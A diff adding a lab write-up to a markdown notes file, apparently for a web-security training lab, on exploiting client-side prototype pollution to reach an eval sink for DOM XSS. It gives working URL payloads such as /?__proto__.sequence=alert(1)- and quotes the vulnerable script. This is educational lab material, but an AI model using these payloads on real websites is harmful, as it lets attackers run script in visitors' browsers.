@@ -1398,6 +1398,78 @@ It is an excellent bypass.
 
 
 
+# 1. **`Find a prototype pollution source`**
+
+```js
+vulnerable-website.com/?__proto__[car]=tesla
+# or
+vulnerable-website.com/?__proto__.car=tesla  # Done
+```
+
+> ## and in console write:
+
+```js
+Object.prototype
+```
+
+<img width="890" height="357" alt="image" src="https://github.com/user-attachments/assets/a16f8dff-24db-49ca-ae4f-ea8e74247a28" />
+
+> we found source
+
+
+# 2. **`Identify a gadget`**
+
+> ### in sourse tab found js files of website
+
+
+<img width="1134" height="332" alt="image" src="https://github.com/user-attachments/assets/78228af4-47d6-4bb8-be4d-8b84f1548a83" />
+
+```js
+async function searchLogger() {
+    window.macros = {};
+    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
+            if (window.macros.hasOwnProperty(property))
+                return macros[property]
+        }};
+    let a = manager.sequence || 1;
+    manager.sequence = a + 1;
+
+    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
+
+    if(manager.params && manager.params.search) {
+        await logQuery('/logger', manager.params);
+    }
+}
+```
+
+> ### found **`eval`** function and we found that manager.sequence is passed to `eval` but this is not defiend by default
+
+```
+vulnerable-website.com/?__proto__.sequence=alert(0)
+```
+
+> ## but nothing happend let's see console
+
+<img width="541" height="85" alt="image" src="https://github.com/user-attachments/assets/763a60fe-bf40-49ad-a532-96b91d5d1374" />
+
+1.  Observe that the payload doesn't execute.
+
+2.  In the browser DevTools panel, go to the **Console** tab. Observe that you have triggered an error.
+
+3.  Click the link at the top of the stack trace to jump to the line where `eval()` is called.
+
+4.  Click the line number to add a breakpoint to this line, then refresh the page.
+
+5.  Hover the mouse over the `manager.sequence` reference and observe that its value is `alert(1)1`. This indicates that we have successfully passed our payload into the sink, but a numeric `1` character is being appended to it, resulting in invalid JavaScript syntax.
+
+6.  Click the line number again to remove the breakpoint, then click the play icon at the top of the browser window to resume code execution.
+
+7.  Add trailing minus character to the payload to fix up the final JavaScript syntax:
+
+    `/?__proto__.sequence=alert(1)-`
+8.  Observe that the `alert(1)` is called and the lab is solved.
+
+
 
 
   
